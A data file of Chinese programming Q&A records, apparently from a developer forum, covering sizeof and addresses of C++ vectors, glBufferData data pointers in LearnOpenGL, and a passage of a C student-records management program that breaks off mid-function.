{"Answer": "```\r\n1. cout &lt;&lt; sizeof(vec) &lt;&lt; endl;    --&gt; cout &lt;&lt; vec.size() &lt;&lt; endl;\r\n2.&amp;vec 实际上就是取到了vec  vector对象的地址。并不是vector的首地址。 \r\n    cout &lt;&lt; (void *)vec.data() &lt;&lt; endl;\r\n    cout &lt;&lt; (void *)&amp;vec[0] &lt;&lt; endl;\r\n    cout &lt;&lt; (void *)&amp;vec[1] &lt;&lt; endl;\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++ vector 的一些疑问", ["环境: Win10 + vs2015 x64 Release", "\n\n", "对于下面的代码:", "\n\n", "vector<char> vec = {'a' , 'b'};\n\ncout << sizeof(vec) << endl;        \n\ncout << sizeof(vec[0]) << endl;     \ncout << sizeof(vec[1]) << endl;     \n\ncout << &vec << endl;\ncout << (void *)&vec[0] << endl;    \ncout << (void *)&vec[1] << endl;\n", "\n\n", "输出的内容为:", "\n\n", "24\n1\n1\n00000069592FFAA0\n0000025041321DA0\n0000025041321DA1\n", "\n\n", "问题1:为什么这个容器的size是24呢?", "\n\n", "问题2:地址&vec和&vec[0]为什么不相同?", "\n\n", "感谢关注与解答!"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;\nglBufferData函数的第三个参数是&lt;span class=\"hljs-keyword\"&gt;const&lt;/span&gt; GLvoid *类型&amp;#xff0c;&amp;amp;indices[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]是取vector中第一个元素的地址&amp;#xff0c;\n它的类型是&lt;span class=\"hljs-keyword\"&gt;unsigned&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; *&amp;#xff0c;可以转换为GLvoid *类型&amp;#xff0c;\n并且vector类型的存储空间是连续的&amp;#xff0c;也就是说&amp;#xff0c;\n通过&amp;amp;indices[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]是可以访问到vector中的所有元素的。\n----------------------------------------------\nGLvoid* 默认要求是传入连续空间数据&amp;#xff0c;而&amp;amp;indices的类型是vector&amp;lt;&lt;span class=\"hljs-keyword\"&gt;unsigned&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &amp;gt; *类型&amp;#xff0c;\n这个类型转换的时候&amp;#xff0c;得到的数据是多个vector&amp;lt;&lt;span class=\"hljs-keyword\"&gt;unsigned&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &amp;gt;元素&amp;#xff0c;\n虽然单个vector&amp;lt;&lt;span class=\"hljs-keyword\"&gt;unsigned&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &amp;gt;中的元素是连续的&amp;#xff0c;\n但是多个vector&amp;lt;&lt;span class=\"hljs-keyword\"&gt;unsigned&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &amp;gt;之间的地址却是相互独立的。\n所以这里用的是&amp;amp;indices[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]&amp;#xff0c;而不是&amp;amp;indices\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["LearnOpenGL中glBufferData中传入的数据为什么是容器的第一个元素，而不是整个容器？", ["在学习LearnOpenGL第三章《导入模型》的《网格》中有一个问题一直没有搞明白，就是", "glBufferData中传入的数据为什么是容器的第一个元素，而不是整个容器？", "\n", "struct Vertex {\n    glm::vec3 Position;\n    glm::vec3 Normal;\n    glm::vec2 TexCoords;\n};\n\nvector<Vertex> vertices;\nvector<unsigned int> indices;\n\nvoid setupMesh()\n{\n    glGenVertexArrays(", "1", ", &VAO);\n    glGenBuffers(", "1", ", &VBO);\n    glGenBuffers(", "1", ", &EBO);\n\n    glBindVertexArray(VAO);\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n     \n     ", "// 这里的&vertices[0]为什么不是&vertices", "\n    glBufferData(GL_ARRAY_BUFFER, vertices.size() * sizeof(Vertex), &vertices", "[0]", ", GL_STATIC_DRAW);  \n\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);\n     ", "//  这里的&indices[0]为什么不是&indices", "\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, indices.size() * sizeof(unsigned int), \n                 &indices", "[0]", ", GL_STATIC_DRAW);\n\n    ", "// 顶点位置", "\n    glEnableVertexAttribArray(", "0", ");   \n    glVertexAttribPointer(", "0", ", ", "3", ", GL_FLOAT, GL_FALSE, sizeof(Vertex), (void*)0);\n    ", "// 顶点法线", "\n    glEnableVertexAttribArray(", "1", ");   \n    glVertexAttribPointer(", "1", ", ", "3", ", GL_FLOAT, GL_FALSE, sizeof(Vertex), (void*)offsetof(Vertex, Normal));\n    ", "// 顶点纹理坐标", "\n    glEnableVertexAttribArray(", "2", ");   \n    glVertexAttribPointer(", "2", ", ", "2", ", GL_FLOAT, GL_FALSE, sizeof(Vertex), (void*)offsetof(Vertex, TexCoords));\n\n    glBindVertexArray(", "0", ");\n}  \n"]], "Tag": "程序设计"}
{"Answer": "完整代码在这里\r\n\r\n\r\n\r\n #include \"stdio.h\"\r\n#include \"string.h\"\r\n#include \"stdlib.h\"\r\n#include \"ctype.h\"\r\n\r\n\r\n\r\nstruct stu  //  学生结构体 学号、姓名、性别、年龄、宿舍号码、电话号码\r\n{\r\n\tint id;//账号\r\n\tchar name[100];//姓名\r\n\tint clas;//班级\r\n\tchar sex[6];//性别\r\n\tint age;//年龄\r\n\tint dor;//宿舍号码\r\n\tchar key[12];//密码\r\n\tchar phone[12];//电话号码\r\n\tint score;\r\n\tstruct stu * next;\r\n\tstruct cla * cla;\r\n}*p1,stu1;\r\n\r\nstruct tec //教师结构体\r\n{\r\n    int id;\r\n\tchar name[100];\r\n\tchar sex[6];\r\n\tchar cla_name[100];\r\n\tint cla_id;//课程编号\r\n    char phone[12];\r\n\tchar key[12];\r\n\tint score;\r\n    char email[30];\r\n    struct cla * cla;\r\n    struct tec * next;\r\n}tec1;\r\n\r\nstruct cla //学生课程结构体 课程编号、课程名称、考试成绩、平时成绩、综合成绩、学分、重修否\r\n{\r\n\tint id;//学生id\r\n\tchar name[100];\r\n\tchar stu_name[100];\r\n\tfloat e_score;\r\n\tfloat n_score;\r\n\tfloat t_score;\r\n\tint score;//学分\r\n\tstruct cla *next;\r\n\tstruct res *res;\r\n\tstruct cla *follow;\r\n\tstruct cla *tec;\r\n}cla1;\r\n\r\nstruct res //重修结构体 重修学期、重修成绩，并且要考虑多次重修\r\n{\r\n\tint id;\r\n\tchar name[100];    //course name\r\n\tint semester;\r\n\tfloat score;\r\n\tint times;\r\n\tstruct res * next;\r\n\tstruct res * follow;\r\n}res1;\r\n\r\nstruct order  // 为了学生成绩排名\r\n{\r\n  struct cla *pointer;\r\n  struct order *next;\r\n};\r\n\r\nstruct info //信息结构体\r\n{\r\n\tint num;  // the amount of stu or cla or res\r\n\tchar key[11];\r\n}in1,in2,in3,in4;\r\n\r\nstruct info2\r\n{\r\n    char name[500];\r\n    char note[500];\r\n    int i;\r\n    struct info2 *next;\r\n};\r\n\r\nFILE *fp3,*fp1,*fp2,*fp4;\r\n\r\nstruct stu * head=NULL,*p1,*p2;\r\nstruct tec * head_tec=NULL;\r\nstruct cla * clap,*headc;\r\nstruct res * resp,*headr;\r\n\r\n\r\n\r\n//definition\r\nvoid apple_ID();//用户注册\r\nvoid file_open();//用来打开文件和构建链表\r\nvoid file_close();\r\nvoid insert_stu(struct stu stu1);//学生结构体插入\r\nvoid insert_tec(struct tec tec1);//教师结构体插入\r\nstruct cla * insert_cla1(struct cla cla1);//将课程插入学生\r\nvoid insert_cla2(struct cla *cp);//将课程插入教师\r\nvoid insert_res(struct res res1);//插入重修\r\nvoid input_stu();//学生录入\r\nvoid input_tec();//教师录入\r\nvoid input_cla();//课程录入\r\nvoid input_res();//重修录入\r\nvoid copy_tec(struct tec *p1,struct tec tec1);//用于复制 减少代码量\r\nvoid copy_stu(struct stu *p1,struct stu stu1);// 用于复制 减少代码量\r\nvoid del_stu();//删除学生信息\r\nvoid del_tec();//删除教师信息\r\nvoid del_res();//删除重修信息\r\nvoid pfree_res(struct cla *p,struct res res1);//解锁及释放重修内存\r\nvoid pfree_cla(struct stu *p_stu,struct tec *p_tec,struct cla cla1);//解锁及释放课程内存\r\nvoid modify_stu(struct stu *p);// 学生修改自己信息\r\nvoid modify_tec(struct tec *p);// 教师修改自己信息\r\nvoid modify_stu_adm();//管理员进入某一学生系统 修改学生信息 如密码\r\nvoid modify_tec_adm();//管理员进入某一教师系统 修改教师信息 如密码\r\nvoid skim_stu(struct stu *head);//按ID或名字查看学生信息\r\nvoid skim_tec(struct tec *head);//按id或名字查看教师\r\nvoid skim_stu_all();//查看所有学生学分及不及格课程\r\nvoid skim_tec_all();//查看所有教师\r\nvoid skim_stu_course();// 根据课程查看学生 管理员功能\r\nvoid skim_stu_class();// 根据班级查看学生 管理员功能\r\nvoid skim_list_stu(struct tec * p);//教师查看所有选自己课的学生\r\nstruct order * list(struct cla *head);// 学生分数排序 返回链表头   to make a list of stu\r\nvoid print_stu(struct stu* p1);//输出学生\r\nvoid adm_ui_1();//学生界面\r\nvoid adm_ui_2();//教师界面\r\nvoid stu_ui(struct stu *p);//管理员界面1\r\nvoid tec_ui(struct tec *p);//管理员界面2\r\nvoid adm_key();//管理员密码修改\r\nvoid st_key_stu(struct stu *p);//学生密码修改\r\nvoid st_key_tec(struct tec *p);//教师密码修改\r\nvoid key_adm();//管理员密码验证 只要密码\r\nvoid key_stu();//学生ID与密码验证\r\nvoid key_tec();//教师ID与密码验证\r\nvoid stu_score(struct tec * p);//教师查看学生分数 按id\r\nvoid tec_score(struct tec *head);//give score to someone 教师给分\r\nint  score_stu(struct stu* p);// 计算学生学分\r\nvoid select_n(struct stu * p);//学生选课必修\r\nvoid select_s(struct stu * p);//学生选课选修\r\nint  idc(char * id);//id装换 char 到int\r\nvoid key(char *key);//以星号形式接受密码并放到地址key上\r\nstruct info2 *Rfile2(struct info2 *head_note);\r\nvoid Savenote(struct info2 *head_note);\r\nstruct info2 *First2(struct info2 *head_note);\r\nvoid watchall(struct info2 *head_note);\r\nstruct info2 *leavenote(struct info2 *head_note);\r\nstruct info2 *notesys(struct info2 *head_note);\r\n\r\nmain()\r\n{\r\n\tint z;\r\n    system(\"cls\");\r\n      file_open();\r\n\tdo\r\n\t{\r\n\t\tprintf(\"\\n\\t\\t\\t+---------------------------+\\n\");\r\n        printf(\"\\t\\t\\t|  欢迎使用教务信息管理系统 |\\n\");\r\n        printf(\"\\t\\t\\t+---------------------------+\\n\");\r\n        printf(\"提示：为保证您的操作得到保存，请按正常顺序退出系统^_^\\n\");\r\n        printf(\"\\n\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"\\t\\t\\t+            主菜单            |\\n\");\r\n        printf(\"\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"\\t\\t\\t+    [1]----学生登录           |\\n\");\r\n        printf(\"\\t\\t\\t+    [2]----教师登录           |\\n\");\r\n\t\tprintf(\"\\t\\t\\t+    [3]----管理员登陆         |\\n\");\r\n        printf(\"\\t\\t\\t+    [4]----用户注册           |\\n\");\r\n        printf(\"\\t\\t\\t+    [0]----退出系统           |\\n\");\r\n        printf(\"\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"请输入您的选择：\");\r\n        scanf(\"%d\", &amp;z);\r\n        switch(z)\r\n        {\r\n        case 0 :    break;\r\n        case 1 :key_stu();break;\r\n        case 2 :key_tec();break;\r\n        case 3 :key_adm();break;\r\n        case 4 :apple_ID();break;\r\n\t\tdefault:printf(\"\\n无效选项!\");\r\n        }\r\n\t}\r\n    while(z!=0);\r\n\tfile_close();  // to free all the pointer and input data to file\r\n}\r\n\r\nvoid file_open()  //用来打开文件和构建链表 head 和 head_tec 是全局变量\r\n{\r\n\tstruct stu stu1;\r\n\tstruct cla cla1;\r\n\tstruct res res1;\r\n\tstruct cla *cp;\r\n\tint a1=0,a2=0,a3=0,a4=0;\r\n\tif((fp1=fopen(\"stu\",\"rb\"))==NULL||(fp2=fopen(\"cla\",\"rb\"))==NULL||(fp3=fopen(\"res\",\"rb\"))==NULL||(fp4=fopen(\"tec\",\"rb\"))==NULL) //can't open the file\r\n\t{\r\n\t\tif((fp1=fopen(\"stu\",\"wb\"))==NULL||(fp2=fopen(\"cla\",\"wb\"))==NULL||(fp3=fopen(\"res\",\"wb\"))==NULL||(fp4=fopen(\"tec\",\"wb\"))==NULL)\r\n\t\tprintf(\"\\nSomething Wrong!\"); exit(0);\r\n\t}\r\n\telse  // open file successfully\r\n\t{\r\n\t\tfread(&amp;in1,sizeof(struct info),1,fp1);\r\n\t\tfread(&amp;in2,sizeof(struct info),1,fp2);\r\n\t\tfread(&amp;in3,sizeof(struct info),1,fp3);\r\n\t\tfread(&amp;in4,sizeof(struct info),1,fp4);\r\n\t\tstrcpy(in2.key,\"19931101\");\r\n\t\tif(in1.num==0&amp;&amp;in2.num==0) strcpy(in1.key,\"123456\");\r\n\t\t// create a linked list\r\n\t\t// add stu struct\r\n        while(fread(&amp;stu1,sizeof(struct stu),1,fp1))\r\n        {\r\n            insert_stu(stu1);\r\n        }\r\n        fclose(fp1);\r\n        while(fread(&amp;tec1,sizeof(struct tec),1,fp4))\r\n        {\r\n            insert_tec(tec1);\r\n        }\r\n        fclose(fp4);\r\n        while(fread(&amp;cla1,sizeof(struct cla),1,fp2))\r\n        {\r\n            cp=insert_cla1(cla1);\r\n            if(cp!=NULL) insert_cla2(cp);\r\n        }\r\n\t\t\tfclose(fp2);\r\n\t\t}\r\n        while(fread(&amp;res1,sizeof(struct res),1,fp3))\r\n        {\r\n            insert_res(res1);\r\n        }\r\n        fclose(fp3);\r\n}\r\n\r\nvoid file_close()  //head和head_tec是全局变量\r\n{\r\n\tstruct stu *p1,*p11;\r\n\tstruct cla *p2,*p21;\r\n\tstruct res *p3,*p31;\r\n\tstruct tec *p4,*p41;\r\n\tfp1=fopen(\"stu\",\"wb\");\r\n\tfp2=fopen(\"cla\",\"wb\");\r\n\tfp3=fopen(\"res\",\"wb\");\r\n\tfp4=fopen(\"tec\",\"wb\");\r\n\r\n\tfwrite(&amp;in1,sizeof(struct info),1,fp1);\r\n\tfwrite(&amp;in2,sizeof(struct info),1,fp2);\r\n\tfwrite(&amp;in3,sizeof(struct info),1,fp3);\r\n\tfwrite(&amp;in4,sizeof(struct info),1,fp4);\r\n\r\n\tp1=head;\r\n\twhile(p1!=NULL)\r\n\t{\r\n\t\tfwrite(&amp;(*p1),sizeof(struct stu),1,fp1);\r\n\t    p11=p1;\r\n\t\tp1=p1-&gt;next;\r\n\t\tfree(p11);\r\n\t}\r\n\r\n\tp4=head_tec;\r\n\twhile(p4!=NULL)\r\n\t{\r\n\t\tfwrite(&amp;(*p4),sizeof(struct tec),1,fp4);\r\n\t    p41=p4;\r\n\t\tp4=p4-&gt;next;\r\n\t\tfree(p41);\r\n\t}\r\n\r\n\tp2=headc;\r\n\twhile(p2!=NULL)\r\n\t{\r\n\t\tfwrite(&amp;(*p2),sizeof(struct cla),1,fp2);\r\n\t    p21=p2;\r\n\t\tp2=p2-&gt;follow;\r\n\t\tfree(p21);\r\n\t}\r\n\tp3=headr;\r\n\twhile(p3!=NULL)\r\n\t{\r\n\t\tfwrite(&amp;(*p3),sizeof(struct res),1,fp3);\r\n\t    p31=p3;\r\n\t\tp3=p3-&gt;follow;\r\n\t\tfree(p31);\r\n\t}\r\n    printf(\"\\nSaved!\\n\");\r\n\r\n}\r\n\r\nvoid apple_ID()\r\n{\r\n    int z;\r\n    file_open();\r\n\r\n    system(\"cls\");\r\n    do\r\n    {\r\n        printf(\"\\n\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"\\t\\t\\t+    华南农业大学教务处欢迎您。|\\n\");\r\n        printf(\"\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"\\t\\t\\t+    [1]----学生注册           |\\n\");\r\n        printf(\"\\t\\t\\t+    [2]----教师注册           |\\n\");\r\n        printf(\"\\t\\t\\t+    [0]----返回主界面         |\\n\");\r\n        printf(\"\\t\\t\\t--------------------------------\\n\");\r\n        printf(\"请输入您的选择：\");\r\n        scanf(\"%d\", &amp;z);\r\n        switch(z)\r\n        {\r\n        case 0 :    break;\r\n        case 1 :input_stu(head);break;\r\n        case 2 :input_tec(head_tec);break;\r\n\t\tdefault:printf(\"\\n无效选项!\");\r\n        }\r\n        }while(z!=0);\r\n}\r\n\r\nvoid insert_stu(struct stu stu1) //学生结构体插入\r\n{\r\n\tstruct stu *p2,*p3;\r\n\tif(head==NULL)  // empty linked list\r\n\t{\r\n\t\tp1=(struct stu *)malloc(sizeof(struct stu));\r\n\t\thead=p1;\r\n\t    copy_stu(p1,stu1);\r\n\t\tp1-&gt;next=NULL;\r\n\t\tp1-&gt;cla=NULL;\r\n\t\tin1.num++;\r\n\t}\r\n\telse\r\n\t{\r\n\t    p2=head; p3=head;\r\n\t\twhile(p2!=NULL)\r\n\t\t{\r\n\t\t     if(p2-&gt;id&gt;=stu1.id) break;\r\n\t\t     p3=p2;\r\n\t\t     p2=p2-&gt;next;\r\n\t\t}\r\n\t\tif(p2==NULL||p2-&gt;id&gt;stu1.id)\r\n\t\t{\r\n\t\t     p2=(struct stu *)head;\r\n\t \t     if(p2-&gt;id&gt;stu1.id)  //insert at the head\r\n\t\t     {\r\n\t\t\t     p1=(struct stu *)malloc(sizeof(struct stu));\r\n\t\t\t     copy_stu(p1,stu1);\r\n                 p1-&gt;next=head;\r\n    \t\t     p1-&gt;cla=NULL;\r\n\t\t\t     in1.num++;\r\n\t\t\t     head=p1;\r\n\t\t     }\r\n\t\t     else //insert at the middle or at the end\r\n\t\t     {\r\n                  while(p2-&gt;id&lt;stu1.id&amp;&amp;p2-&gt;next!=NULL) // to find the point to insert\r\n\t\t\t      {\r\n\t\t\t          if(p2-&gt;id==stu1.id) break;\r\n                      p3=p2;p2=p2-&gt;next;\r\n\t\t\t      }\r\n\t\t\t      if(p2-&gt;next==NULL&amp;&amp;p2-&gt;id&lt;stu1.id) // insert at the end\r\n\t\t\t      {\r\n\t\t\t\t      p1=(struct stu *)malloc(sizeof(struct stu));\r\n\t    \t\t      copy_stu(p1,stu1);\r\n        \t\t      p1-&gt;next=NULL;\r\n         \t\t      p1-&gt;cla=NULL;\r\n\t\t\t\t      in1.num++;\r\n\t    \t\t      p2-&gt;next=p1;\r\n\t\t\t       }\r\n\t\t\t       else //insert at the middle\r\n\t\t\t       {\r\n\t\t\t\t       p1=(struct stu *)malloc(sizeof(struct stu));\r\n\t    \t\t       copy_stu(p1,stu1);\r\n        \t\t       p1-&gt;next=p2;\r\n         \t\t       p1-&gt;cla=NULL;\r\n\t\t\t\t       in1.num++;\r\n\t\t\t\t       p3-&gt;next=p1;\r\n\t\t\t       }\r\n\r\n             }\r\n\t\t}\r\n\t\telse printf(\"\\n该生已存在。\");\r\n\t}\r\n}\r\n\r\nvoid insert_tec(struct tec tec1) //教师结构体插入\r\n{\r\n\tstruct tec *p1,*p2,*p3;\r\n\tif(head_tec==NULL)  // empty linked list\r\n\t{\r\n\t\tp1=(struct tec *)malloc(sizeof(struct tec));\r\n\t\thead_tec=p1;\r\n\t\tp1-&gt;id=tec1.id;\r\n        copy_tec(p1,tec1);\r\n\t\tp1-&gt;next=NULL;\r\n\t\tin4.num++;\r\n\t\tp1-&gt;cla=NULL;\r\n\t}\r\n\telse\r\n\t{\r\n\t    p2=head_tec;\r\n\t    p3=head_tec;\r\n\t\twhile(p2!=NULL)\r\n\t\t{\r\n\t\t     if(p2-&gt;id&gt;=tec1.id) break;\r\n\t\t\t p3=p2;\r\n\t\t\t p2=p2-&gt;next;\r\n\t\t}\r\n\t\tif(p2==NULL||p2-&gt;id&gt;tec1.id)\r\n\t\t{\r\n\t\t     p2=(struct tec *)head_tec;\r\n\t \tif(p2-&gt;id&gt;tec1.id)  //insert at the head\r\n\t\t{\r\n\t\t\tp1=(struct tec *)malloc(sizeof(struct tec));\r\n            p1-&gt;id=tec1.id;\r\n\t\t\tcopy_tec(p1,tec1);\r\n    \t\tp1-&gt;next=head_tec;\r\n    \t\tp1-&gt;cla=NULL;\r\n\t\t\tin4.num++;\r\n\t\t\thead_tec=p1;\r\n\t\t}\r\n\t\telse //insert at the middle or at the end\r\n\t\t{\r\n\t\t\twhile(p2-&gt;id&lt;tec1.id&amp;&amp;p2-&gt;next!=NULL) // to find the point to insert\r\n\t\t\t{\r\n\t\t\t\tp3=p2;\r\n\t\t\t\tp2=p2-&gt;next;\r\n\t\t\t}\r\n\r\n\t\t\tif(p2-&gt;next==NULL&amp;&amp;p2-&gt;id&lt;tec1.id) // insert at the end\r\n\t\t\t{\r\n\t\t\t\tp1=(struct tec *)malloc(sizeof(struct tec));\r\n\t    \t\tp1-&gt;id=tec1.id;\r\n    \t     \tcopy_tec(p1,tec1);\r\n        \t\tp1-&gt;next=NULL;\r\n         \t\tp1-&gt;cla=NULL;\r\n\t\t\t\tin4.num++;\r\n\t    \t\tp2-&gt;next=p1;\r\n\t\t\t}\r\n\t\t\telse //insert at the middle\r\n\t\t\t{\r\n\t\t\t\tp1=(struct tec *)malloc(sizeof(struct tec));\r\n\t    \t\t p1-&gt;id=tec1.id;\r\n    \t     \tcopy_tec(p1,tec1);\r\n        \t\tp1-&gt;next=p2;\r\n         \t\tp1-&gt;cla=NULL;\r\n\t\t\t\tin4.num++;\r\n\t\t\t\tp3-&gt;next=p1;\r\n\t\t\t}\r\n        }\r\n        }\r\n        else printf(\"\\n该教师已存在。\");\r\n\r\n\t}\r\n}\r\n\r\nstruct cla * insert_cla1(struct cla cla1)  //将课程插入学生\r\n{\r\n\tstruct cla *p1,*p2,*p3;\r\n\tstruct stu *p;\r\n\tp=(struct stu *)head;\r\n\twhile(p-&gt;id!=cla1.id&amp;&amp;p-&gt;next!=NULL&amp;&amp;p-&gt;id&lt;cla1.id)  //寻找课程所属学生\r\n\t{\r\n\t\tp=p-&gt;next;\r\n\t}\r\n\tif((p-&gt;next==NULL&amp;&amp;p-&gt;id!=cla1.id)||p-&gt;id&gt;cla1.id)\r\n\t{\r\n\t\tprintf(\"\\n查无此生!信息没有插入！\");\r\n\t}\r\n\telse\r\n\t{\r\n\t\tp1=(struct cla*)p-&gt;cla;\r\n\t\tp3=(struct cla*)p-&gt;cla;\r\n\t\twhile(p1!=NULL) //p3为前一个指针 p1为当前地址\r\n\t\t{\r\n\t\t    if(strcmp(p1-&gt;name,cla1.name)==0) break;\r\n\t\t\tp3=p1; p1=p1-&gt;next;\r\n\r\n\t\t}\r\n\t\tif(p1!=NULL&amp;&amp;strcmp(p1-&gt;name,cla1.name)==0)\r\n\t\t{\r\n\t\t     p1-&gt;e_score=cla1.e_score;\r\n\t\t     p1-&gt;n_score=cla1.n_score;\r\n\t\t     p1-&gt;t_score=cla1.t_score;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t    p2=(struct cla*)malloc(sizeof(struct cla));\r\n\t     \tp2-&gt;id=cla1.id;\r\n \t     \tstrcpy(p2-&gt;name,cla1.name);\r\n\t\t\tstrcpy(p2-&gt;stu_name,p-&gt;name);\r\n\t     \tp2-&gt;e_score=cla1.e_score;\r\n\t     \tp2-&gt;n_score=cla1.n_score;\r\n\t     \tp2-&gt;t_score=cla1.t_score;\r\n\t    \tp2-&gt;next=NULL;\r\n\t    \tp2-&gt;res=NULL;\r\n\t\t    if(p3==NULL) p-&gt;cla=p2;\r\n\t\t    else p3-&gt;next=p2;\r\n\t     \t// to make a follow\r\n\t    \tif(in2.num==0)\r\n\t     \t{\r\n\t     \t    headc=p2;\r\n\t     \t    clap=p2;\r\n\t     \t    p2-&gt;follow=NULL;\r\n\t     \t    in2.num++;\r\n            }\r\n\t\t    else\r\n\t\t    {\r\n\t\t        clap-&gt;follow=p2;\r\n\t\t        clap=p2;\r\n\t\t        p2-&gt;follow=NULL;\r\n\t\t        in2.num++;\r\n            }\r\n        }\r\n        return p2;\r\n    }\r\n\treturn NULL;\r\n}\r\n\r\nvoid insert_cla2(struct cla *cp)//将课程插入教师\r\n{\r\n\tstruct cla *p1,*p2,*p3;\r\n\tstruct tec *p;\r\n\tp=(struct tec *)head_tec;\r\n\twhile(strcmp(p-&gt;cla_name,cp-&gt;name)!=0&amp;&amp;p-&gt;next!=NULL)\r\n\t{\r\n\t\tp=p-&gt;next;\r\n\t}\r\n\tif(p-&gt;next==NULL&amp;&amp;strcmp(p-&gt;cla_name,cp-&gt;name)!=0)\r\n\t{\r\n\t\tprintf(\"\\n信息没有插入！\");\r\n\t}\r\n\telse\r\n\t{\r\n\t\tp1=(struct cla*)p-&gt;cla;\r\n\t\tp3=(struct cla*)p-&gt;cla;\r\n\t\twhile(p1!=NULL)\r\n\t\t{\r\n\t\t\tif(p1-&gt;id==cp-&gt;id) break;\r\n\t\t\tp3=p1;\r\n\t\t\tp1=p1-&gt;tec;\r\n\t\t}\r\n\t\tif(p1!=NULL&amp;&amp;p1-&gt;id==cp-&gt;id)\r\n\t\t{\r\n\t\t     p1-&gt;e_score=cp-&gt;e_score;\r\n\t\t\t p1-&gt;n_score=cp-&gt;n_score;\r\n\t\t     p1-&gt;t_score=cp-&gt;t_score;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t     p2=cp;\r\n\t\t     p2-&gt;tec=NULL;\r\n\t\t\t p2-&gt;score=p-&gt;score;\r\n\t\t     if(p3==NULL) p-&gt;cla=p2;\r\n\t\t     else p3-&gt;tec=p2;\r\n\t\t}\r\n\r\n\t}\r\n}\r\n\r\nvoid insert_res(struct res res1)//插入重修\r\n{\r\n\tstruct stu *p;\r\n\tstruct res *p1,*p2,*p4;\r\n\tstruct cla *p3;\r\n\tp=(struct stu *)head;\r\n\twhile(p-&gt;id!=res1.id&amp;&amp;p-&gt;next!=NULL&amp;&amp;p-&gt;id&lt;res1.id)\r\n\t{\r\n\t\tp=p-&gt;next;\r\n\t}\r\n\tif((p-&gt;next==NULL&amp;&amp;p-&gt;id!=res1.id)||p-&gt;id&gt;res1.id)\r\n\t{\r\n\t\tprintf(\"\\n查无此生!信息没有插入！\");\r\n\t}\r\n\telse\r\n\t{\r\n\t\tp3=(struct cla*)p-&gt;cla;\r\n\t\tif(p3==NULL)\r\n\t\t{\r\n\t\t    printf(\"\\n该生尚无课程信息！\");\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t    while(strcmp(p3-&gt;name,res1.name)!=0&amp;&amp;p3-&gt;next!=NULL)\r\n\t\t    {\r\n\t\t    \tp3=p3-&gt;next;\r\n\t\t    }\r\n\t\t   if(p3-&gt;next==NULL&amp;&amp;strcmp(p3-&gt;name,res1.name)!=0)\r\n\t\t    {\r\n\t\t    \tprintf(\"\\n该课程不存在!\");\r\n\t\t    }\r\n\t\t    else\r\n\t\t    {\r\n\t\t\t    p1=(struct res *)p3-&gt;res;\r\n\t\t\t    p4=(struct res *)p3-&gt;res;\r\n\t\t\t    while(p1!=NULL)\r\n\t\t    \t{\r\n\t\t\t\t    if(p1-&gt;times==res1.times) break;\r\n\t\t\t\t\tp4=p1;\r\n\t\t\t\t\tp1=p1-&gt;next;\r\n\t\t\t    }\r\n\t\t\t\tif(p1!=NULL&amp;&amp;p1-&gt;times==res1.times)\r\n\t\t\t\t{\r\n\t\t\t\t     p1-&gt;score=res1.score;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t    p2=(struct res*)malloc(sizeof(struct res));\r\n\t\t\t        p2-&gt;id=res1.id;\r\n\t\t        \tstrcpy(p2-&gt;name,res1.name);\r\n\t\t        \tp2-&gt;score=res1.score;\r\n\t\t        \tp2-&gt;semester=res1.semester;\r\n\t\t         \tp2-&gt;times=res1.times;\r\n\t\t         \tp2-&gt;next=NULL;\r\n\t\t\t    \tif(p4==NULL) p3-&gt;res=p2;\r\n\t\t        \telse p4-&gt;next=p2;\r\n\t\t\t     \t// to make a follow\r\n\t             \tif(in3.num==0)\r\n\t         \t    {\r\n\t         \t        headr=p2;\r\n\t         \t        resp=p2;\r\n\t         \t        p2-&gt;follow=NULL;\r\n\t         \t        in3.num++;\r\n                    }\r\n\t        \t    else\r\n\t          \t    {\r\n\t          \t        resp-&gt;follow=p2;\r\n\t          \t        resp=p2;\r\n\t          \t        p2-&gt;follow=NULL;\r\n\t          \t        in3.num++;\r\n                    }\r\n\t\t\t\t}\r\n\t\t    }\r\n\t\t}\r\n    }\r\n}\r\n\r\nvoid input_stu()  //学生录入\r\n{\r\n\tstruct stu stu1;\r\n\tprintf(\"\\n请输入学生数据,输入0结束输入.\");\r\n\tprintf(\"\\n请输入学生ID(8位数字):\");\r\n\tscanf(\"%d\",&amp;stu1.id);\r\n\twhile(stu1.id!=0)\r\n\t{\r\n\t\t//initialize and create\r\n\t\tprintf(\"\\n请输入学生姓名:\");scanf(\"%s\",stu1.name);\r\n\t\tprintf(\"\\n请输入学生宿舍（五位数字比如08207）:\");scanf(\"%d\",&amp;stu1.dor);\r\n\t\tprintf(\"\\n请输入学生班级（2位数字比如01）:\");scanf(\"%d\",&amp;stu1.clas);\r\n\t\tprintf(\"\\n请输入学生性别(男或女):\");scanf(\"%s\",stu1.sex);\r\n\t\tprintf(\"\\n请输入学生年龄：\");scanf(\"%d\",&amp;stu1.age);\r\n\t\tprintf(\"\\n请输入学生电话号码(11位手机号码):\");scanf(\"%s\",stu1.phone);\r\n\t\tprintf(\"\\n请输入学生密码:\");scanf(\"%s\",stu1.key);\r\n        